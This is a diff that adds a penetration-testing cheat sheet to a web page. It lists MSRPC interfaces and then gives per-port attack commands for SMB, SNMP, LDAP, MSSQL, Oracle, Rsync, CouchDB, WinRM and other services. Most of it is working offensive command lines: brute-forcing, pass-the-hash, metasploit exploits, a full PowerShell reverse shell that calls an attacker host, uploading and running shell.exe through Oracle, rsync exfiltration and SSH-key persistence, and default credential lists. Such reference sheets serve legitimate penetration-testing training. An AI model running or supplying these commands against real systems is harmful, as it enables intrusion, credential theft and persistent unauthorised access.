+<table>
+<thead>
+<tr>
+<th>policyagent</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_ipsec_w2k.html">PolicyAgent</a> interface (IPSEC Policy Agent (Windows 2000))</th>
+<th>PolicyAgent</th>
+<th>d335b8f6-cb31-11d0-b0f9-006097ba4e54 v1.5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>ipsec</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winipsec.html">winipsec</a> interface (IPsec Services)</th>
+<th>PolicyAgent</th>
+<th>12345678-1234-abcd-ef00-0123456789ab v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>ProfMapApi</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">pmapapi</a> interface</th>
+<th>winlogon.exe</th>
+<th>369ce4f0-0fdc-11d3-bde8-00c04f8eee78 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>protected_storage</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_protected_storage.html">IPStoreProv</a> interface (Protected Storage)</th>
+<th>lsass.exe</th>
+<th>c9378ff1-16f7-11d0-a0b2-00aa0061426a v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>ROUTER</th>
+<th>Remote Access</th>
+<th>mprdim.dll</th>
+<th>8f09f000-b7ed-11ce-bbd2-00001a181cad v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>samr (lsass alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_samr.html">samr</a> interface</th>
+<th>lsass.exe</th>
+<th>12345778-1234-abcd-ef00-0123456789ac v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>scerpc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_sce.html">SceSvc</a></th>
+<th>services.exe</th>
+<th>93149ca2-973b-11d1-8c39-00c04fb984f9 v0.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>SECLOGON</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_seclogon.html">ISeclogon</a> interface (Secondary logon service)</th>
+<th>seclogon</th>
+<th>12b81e99-f207-4a4c-85d3-77b42f76fd14 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>SfcApi</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_sfcapi.html">sfcapi</a> interface (Windows File Protection)</th>
+<th>winlogon.exe</th>
+<th>83da7c00-e84f-11d2-9807-00c04f8ec850 v2.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>spoolss</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_spoolss.html">spoolss</a> interface (Spooler service)</th>
+<th>spoolsv.exe</th>
+<th>12345678-1234-abcd-ef00-0123456789ab v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>srvsvc (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_srvsvc.html">srvsvc</a> interface (Server service)</th>
+<th>services.exe (w2k) or svchost.exe (wxp and w2k3)</th>
+<th>4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>ssdpsrv</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_ssdpsrv.html">ssdpsrv</a> interface (SSDP service)</th>
+<th>ssdpsrv</th>
+<th>4b112204-0e19-11d3-b42b-0000f81feb9f v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>svcctl (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_svcctl.html">svcctl</a> interface (Services control manager)</th>
+<th>services.exe</th>
+<th>367aeb81-9844-35f1-ad32-98f038001003 v2.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>tapsrv</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_tapsrv.html">tapsrv</a> interface (Telephony service)</th>
+<th>Tapisrv</th>
+<th>2f5f6520-ca46-1067-b319-00dd010662da v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>trkwks</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_trkwks.html">trkwks</a> interface (Distributed Link Tracking Client)</th>
+<th>Trkwks</th>
+<th>300f3532-38cc-11d0-a3f0-0020af6b0add v1.2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>W32TIME (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_w32time.html">w32time</a> interface (Windows Time (Windows 2000 and XP))</th>
+<th>w32time</th>
+<th>8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>W32TIME_ALT</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_w32time.html">w32time</a> interface (Windows Time (Windows Server 2003, Windows Vista))</th>
+<th>w32time</th>
+<th>8fb6d884-2388-11d0-8c35-00c04fda2795 v4.1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>winlogonrpc</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winlogon_w2k.html">GetUserToken</a> interface</th>
+<th>winlogon.exe</th>
+<th>a002b3a0-c9b7-11d1-ae88-0080c75e4ec1 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>winreg</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winreg.html">winreg</a> interface (Remote registry service)</th>
+<th>RemoteRegistry</th>
+<th>338cd001-2244-31f1-aaaa-900038001003 v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>winspipe</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_winsif.html">winsif</a> interface (WINS service)</th>
+<th>wins.exe</th>
+<th>45f52c28-7f9f-101a-b52b-08002b2efabe v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>wkssvc (ntsvcs alias)</th>
+<th><a href="https://web.archive.org/web/20171012160520/http://www.hsc.fr/ressources/articles/win_net_srv/msrpc_wkssvc.html">wkssvc</a> interface (Workstation service)</th>
+<th>services.exe (w2k) or svchost.exe (wxp and w2k3)</th>
+<th>6bffd098-a112-3610-9833-46c3f87e345a v1.0</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="port-139445-smb">Port 139/445 - SMB</h2>
+<pre><code class="language-bash"># Enum hostname
+enum4linux -n 10.11.1.111
+nmblookup -A 10.11.1.111
+nmap --script=smb-enum* --script-args=unsafe=1 -T5 10.11.1.111
+
+# Get Version
+smbver.sh 10.11.1.111
+Msfconsole;use scanner/smb/smb_version
+ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' 
+smbclient -L \\\\10.11.1.111
+
+# Get Shares
+smbmap -H  10.11.1.111 -R 
+echo exit | smbclient -L \\\\10.11.1.111
+smbclient \\\\10.11.1.111\\
+smbclient -L //10.11.1.111 -N
+nmap --script smb-enum-shares -p139,445 -T4 -Pn 10.11.1.111
+smbclient -L \\\\10.11.1.111\\
+# If got error &quot;protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED&quot;
+smbclient -L //10.11.1.111/ --option='client min protocol=NT1'
+
+# Check null sessions
+smbmap -H 10.11.1.111
+rpcclient -U &quot;&quot; -N 10.11.1.111
+smbclient //10.11.1.111/IPC$ -N
+
+# Exploit null sessions
+enum -s 10.11.1.111
+enum -U 10.11.1.111
+enum -P 10.11.1.111
+enum4linux -a 10.11.1.111
+#https://github.com/cddmp/enum4linux-ng/
+enum4linux-ng.py 10.11.1.111 -A -C
+/usr/share/doc/python3-impacket/examples/samrdump.py 10.11.1.111
+
+# Connect to username shares
+smbclient //10.11.1.111/share -U username
+
+# Connect to share anonymously
+smbclient \\\\10.11.1.111\\
+smbclient //10.11.1.111/
+smbclient //10.11.1.111/
+smbclient //10.11.1.111/&lt;&quot;&quot;share name&quot;&quot;&gt;
+rpcclient -U &quot; &quot; 10.11.1.111
+rpcclient -U &quot; &quot; -N 10.11.1.111
+
+# Check vulns
+nmap --script smb-vuln* -p139,445 -T4 -Pn 10.11.1.111
+
+# Multi exploits
+msfconsole; use exploit/multi/samba/usermap_script; set lhost 192.168.0.X; set rhost 10.11.1.111; run
+
+# Bruteforce login
+medusa -h 10.11.1.111 -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt 
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.11.1.111  -vvvv
+nmap –script smb-brute 10.11.1.111
+
+# nmap smb enum &amp; vuln 
+nmap --script smb-enum-*,smb-vuln-*,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-protocols -p 139,445 10.11.1.111
+nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse -p 139,445 10.11.1.111
+
+# Mount smb volume linux
+mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
+
+# rpcclient commands
+rpcclient -U &quot;&quot; 10.11.1.111
+    srvinfo
+    enumdomusers
+    getdompwinfo
+    querydominfo
+    netshareenum
+    netshareenumall
+
+# Run cmd over smb from linux
+winexe -U username //10.11.1.111 &quot;cmd.exe&quot; --system
+
+# smbmap
+smbmap.py -H 10.11.1.111 -u administrator -p asdf1234 #Enum
+smbmap.py -u username -p 'P@$$w0rd1234!' -d DOMAINNAME -x 'net group &quot;Domain Admins&quot; /domain' -H 10.11.1.111 #RCE
+smbmap.py -H 10.11.1.111 -u username -p 'P@$$w0rd1234!' -L # Drive Listing
+smbmap.py -u username -p 'P@$$w0rd1234!' -d ABC -H 10.11.1.111 -x 'powershell -command &quot;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&quot;&quot;&quot;&quot;192.168.0.X&quot;&quot;&quot;&quot;; $port=&quot;&quot;&quot;&quot;4445&quot;&quot;&quot;&quot;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&quot;&quot;&quot;&quot;cmd.exe&quot;&quot;&quot;&quot;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&quot;' # Reverse Shell
+
+# Check
+\Policies\{REG}\MACHINE\Preferences\Groups\Groups.xml look for user&amp;pass &quot;gpp-decrypt &quot;
+
+# CrackMapExec
+crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local
+crackmapexec smb 10.55.100.0/23 -u LA-ITAdmin -H 573f6308519b3df23d9ae2137f549b15 --local --lsa
+
+# Impacket
+python3 samdump.py SMB 172.21.0.0
+
+# Check for systems with SMB Signing not enabled
+python3 RunFinger.py -i 172.21.0.0/24
+</code></pre>
+<h2 id="port-161162-udp-snmp">Port 161/162 UDP - SNMP</h2>
+<pre><code class="language-bash">nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
+nmap 10.11.1.111 -Pn -sU -p 161 --script=snmp-brute,snmp-hh3c-logins,snmp-info,snmp-interfaces,snmp-ios-config,snmp-netstat,snmp-processes,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users
+snmp-check 10.11.1.111 -c public|private|community
+snmpwalk -c public -v1 ipaddress 1
+snmpwalk -c private -v1 ipaddress 1
+snmpwalk -c manager -v1 ipaddress 1
+onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 172.21.0.X
+
+# Impacket
+python3 samdump.py SNMP 172.21.0.0 
+
+# MSF aux modules
+ auxiliary/scanner/misc/oki_scanner                                    
+ auxiliary/scanner/snmp/aix_version                                   
+ auxiliary/scanner/snmp/arris_dg950                                   
+ auxiliary/scanner/snmp/brocade_enumhash                               
+ auxiliary/scanner/snmp/cisco_config_tftp                               
+ auxiliary/scanner/snmp/cisco_upload_file                              
+ auxiliary/scanner/snmp/cnpilot_r_snmp_loot                             
+ auxiliary/scanner/snmp/epmp1000_snmp_loot                             
+ auxiliary/scanner/snmp/netopia_enum                                    
+ auxiliary/scanner/snmp/sbg6580_enum                                 
+ auxiliary/scanner/snmp/snmp_enum                                 
+ auxiliary/scanner/snmp/snmp_enum_hp_laserjet                           
+ auxiliary/scanner/snmp/snmp_enumshares                                
+ auxiliary/scanner/snmp/snmp_enumusers                                 
+ auxiliary/scanner/snmp/snmp_login
+</code></pre>
+<h2 id="port-389636-ldap">Port 389,636 - LDAP</h2>
+<p>Check <a href="../post-exploitation/windows/ad/">AD</a> section and this <a href="https://malicious.link/post/2022/ldapsearch-reference/">LDAP</a> guide</p>
+<pre><code class="language-bash">jxplorer
+ldapsearch -h 10.11.1.111 -p 389 -x -b &quot;dc=mywebsite,dc=com&quot;
+python3 windapsearch.py --dc-ip 10.10.10.182 --users --full &gt; windapsearch_users.txt
+cat windapsearch_users.txt | grep sAMAccountName | cut -d &quot; &quot; -f 2 &gt; users.txt
+# Check # https://github.com/ropnop/go-windapsearch
+</code></pre>
+<h2 id="port-443-https">Port 443 - HTTPS</h2>
+<p>Read the actual SSL CERT to:</p>
+<ul>
+<li>find out potential correct vhost to GET</li>
+<li>is the clock skewed</li>
+<li>any names that could be usernames for bruteforce/guessing.</li>
+</ul>
+<pre><code class="language-bash">./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST &gt; OUTPUT-FILE.html
+# Check for mod_ssl,OpenSSL version Openfuck
+</code></pre>
+<h2 id="port-500-isakmp-ike">Port 500 - ISAKMP IKE</h2>
+<pre><code>ike-scan 10.11.1.111
+</code></pre>
+<h2 id="port-513-rlogin">Port 513 - Rlogin</h2>
+<pre><code>apt install rsh-client
+rlogin -l root 10.11.1.111
+</code></pre>
+<h2 id="port-541-fortinet-sslvpn">Port 541 - FortiNet SSLVPN</h2>
+<p><a href="https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png">Fortinet Ports Guide</a></p>
+<p><a href="https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ">SSL VPN Leak</a></p>
+<h2 id="port-873-rsync">Port 873 - Rsync</h2>
+<pre><code class="language-bash"># Connect to Rsync Server
+rsync rsync://user@target_host/
+
+# Identify Rsync Server
+nmap -p 873 X.X.X.X
+
+# Banner Grabbing
+nc -nv X.X.X.X 873
+# Expected output format:
+# @RSYNCD: version
+
+# Enumerate Modules
+nmap -sV --script &quot;rsync-list-modules&quot; -p 873 target_host
+
+# Metasploit - Enumerate Modules
+msfconsole
+use auxiliary/scanner/rsync/modules_list
+set RHOSTS target_host
+run
+
+# Enumerate Shared Folders
+rsync target_host::
+rsync -av --list-only rsync://target_host/module_name
+
+# Check for Outdated Rsync Version
+nmap -sV --script=rsync-list-modules target_host
+
+# Exploit Misconfigured Modules (Writable)
+rsync -avz /local/file rsync://target_host/module_name/
+
+# Post-Exploitation - Data Exfiltration
+rsync -avz target_host::module_name /local/directory/
+
+# Gain Persistent Access
+rsync -av home_user/.ssh/ rsync://user@target_host/home_user/.ssh
+rsync -avz vitest.service 192.168.110.207::backup/vitest.service
+</code></pre>
+<h2 id="port-1433-mssql">Port 1433 - MSSQL</h2>
+<pre><code class="language-bash">nmap -p 1433 -sU --script=ms-sql-info.nse 10.11.1.111
+use auxiliary/scanner/mssql/mssql_ping
+use auxiliary/scanner/mssql/mssql_login
+use exploit/windows/mssql/mssql_payload
+sqsh -S 10.11.1.111 -U sa
+    xp_cmdshell 'date'
+      go
 
 
+EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system(&quot;whoami&quot;)'
+
+https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/
+</code></pre>
+<h2 id="port-1521-oracle">Port 1521 - Oracle</h2>
+<pre><code class="language-bash">oscanner -s 10.11.1.111 -P 1521
+tnscmd10g version -h 10.11.1.111
+tnscmd10g status -h 10.11.1.111
+nmap -p 1521 -A 10.11.1.111
+nmap -p 1521 --script=oracle-tns-version,oracle-sid-brute,oracle-brute
+MSF: good modules under auxiliary/admin/oracle and scanner/oracle
+
+# https://github.com/quentinhardy/odat
+./odat-libc2.5-i686 all -s 10.11.1.111 -p 1521
+./odat-libc2.5-i686 sidguesser -s 10.11.1.111 -p 1521
+./odat-libc2.5-i686 passwordguesser -s 10.11.1.111 -p 1521 -d XE
+
+# Upload reverse shell with ODAT:
+./odat-libc2.5-i686 utlfile -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:/ shell.exe /root/shell.exe
+
+# and run it:
+./odat-libc2.5-i686 externaltable -s 10.11.1.111 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:/ shell.exe
+</code></pre>
+<h2 id="port-2000-cisco-sccp">Port 2000 - Cisco sccp</h2>
+<pre><code class="language-bash"># cisco-audit-tool
+CAT -h ip -p 2000 -w /usr/share/wordlists/rockyou.txt 
+
+# cisco-smart-install
+https://github.com/Sab0tag3d/SIET/
+sudo python siet.py -g -i 192.168.0.1
+</code></pre>
+<h2 id="port-2049-nfs">Port 2049 - NFS</h2>
+<pre><code class="language-bash">nmap -p 111,2049 --script nfs-ls,nfs-showmount
+
+showmount -e 10.11.1.111
+
+# If you find anything you can mount it like this:
+
+mount 10.11.1.111:/ /tmp/NFS –o nolock
+mount -t nfs 10.11.1.111:/ /tmp/NFS –o nolock
+</code></pre>
+<h2 id="port-2100-oracle-xml-db">Port 2100 - Oracle XML DB</h2>
+<p>Default passwords:</p>
+<p><a href="https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm">https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</a></p>
+<h2 id="port-3306-mysql">Port 3306 - MySQL</h2>
+<pre><code class="language-bash">nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse 10.11.1.111 -p 3306
+
+mysql --host=10.11.1.111 -u root -p
+
+# MYSQL UDF 4.x/5.0
+https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
+</code></pre>
+<h2 id="port-3389-rdp">Port 3389 - RDP</h2>
+<pre><code class="language-bash">nmap -p 3389 --script=rdp-vuln-ms12-020.nse
+rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
+rdesktop -u guest -p guest 10.11.1.111 -g 94%
+ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
+python crowbar.py -b rdp -s 10.11.1.111/32 -u admin -C ../rockyou.txt -v
+</code></pre>
+<h2 id="port-5432-postgresql">Port 5432 - PostgreSQL</h2>
+<pre><code class="language-bash">psql -h 10.10.1.111 -U postgres -W
+
+# Default creds
+postgres : postgres
+postgres : password
+postgres : admin
+admin : admin
+admin : password
+
+pg_dump --host=10.10.1.111 --username=postgres --password --dbname=template1 --table='users' -f output_pgdump
+</code></pre>
+<h2 id="port-5900-vnc">Port 5900 - VNC</h2>
+<pre><code class="language-bash">nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111
+</code></pre>
+<h2 id="port-5984-couchdb">Port 5984 - CouchDB</h2>
+<pre><code class="language-bash">curl http://example.com:5984/
+curl -X GET http://IP:5984/_all_dbs
+curl -X GET http://user:password@IP:5984/_all_dbs
+
+# CVE-2017-12635 RCE
+
+# Create user
+curl -X PUT ‘http://localhost:5984/_users/org.couchdb.user:chenny' — data-binary ‘{ “type”: “user”, “name”: “chenny”, “roles”: [“_admin”], “roles”: [], “password”: “password” }’
+
+# Dump database
+curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u chenny:-Xpassword &lt;ds/_all_docs?include_docs=true -u chenny:-Xpassword
+
+# Dump passwords
+curl -X GET http://user:passwords@localhost:5984/passwords
+</code></pre>
+<h2 id="port-5985-winrm">Port 5985 - WinRM</h2>
+<pre><code class="language-bash"># https://github.com/Hackplayers/evil-winrm
+gem install evil-winrm
+evil-winrm -i 10.11.1.111 -u Administrator -p 'password1'
+evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
+</code></pre>
+<h2 id="port-6379-redis">Port 6379 - Redis</h2>
+<pre><code class="language-bash"># https://github.com/Avinash-acid/Redis-Server-Exploit
+python redis.py 10.10.10.160 redis
+</code></pre>
+<h2 id="port-8172-msdeploy">Port 8172 - MsDeploy</h2>
+<pre><code class="language-bash"># Microsoft IIS Deploy port
+IP:8172/msdeploy.axd
+</code></pre>
+<h2 id="port-56019200">Port 5601/9200</h2>
+<p><a href="webservices/elk.md">ELK</a></p>
+<h2 id="port-27017-192708028017-mongodb">Port 27017-19/27080/28017 - MongoDB</h2>
+<p><a href="webservices/nosql-and-and-mongodb.md">MongoDB</a></p>
+<h2 id="unknown-ports">Unknown ports</h2>
+<ul>
+<li><code>amap -d 10.11.1.111 8000</code></li>
+<li>netcat: makes connections to ports. Can echo strings or give shells: <code>nc -nv 10.11.1.111 110</code></li>
+<li>sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, using basic HTTP configurations</li>
+</ul>
+<h2 id="rce-ports">RCE ports</h2>
+<p><img alt="" src="../.gitbook/assets/image (1).png" /></p>
 
 
 
@@ -970,7 +2703,7 @@
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "search.highlight", "search.share", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "search.highlight", "search.share", "content.code.annotate", "toc.integrate"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
